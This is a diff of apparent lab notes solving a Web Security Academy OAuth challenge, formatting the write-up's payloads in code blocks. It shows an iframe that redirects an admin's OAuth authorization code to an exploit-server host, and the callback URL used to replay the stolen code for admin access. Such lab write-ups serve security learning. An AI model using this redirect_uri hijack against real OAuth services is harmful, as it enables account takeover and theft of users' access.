@@ -15,8 +15,9 @@ client_id=hvzf7wf1lr7d6aqc8g1wn
 https://exploit-0abf0003030d954e82a437c9011c0062.exploit-server.net
 
 ## Final payload
-
+```
 <iframe src="https://oauth-0a25001703d7952382bc382a00cd004e.web-security-academy.net/auth?client_id=hvzf7wf1lr7d6aqc8g1wn&redirect_uri=https://exploit-0abf0003030d954e82a437c9011c0062.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+```
 
 ## Send to the admin, when admin clicks it, we get authorization code
 
@@ -29,7 +30,7 @@ https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
 ```
 
 ## Final Oauth_code paylod
-
+```
 https://0a25001703d7952382bc382a00cd004e.web-security-academy.net/oauth-callback?code=XI7nQtdvu94bgj-Z2uj-ktbGVbFBYKf1uI4GfGsbj0mx1
-
+```
 FInally got an admin access
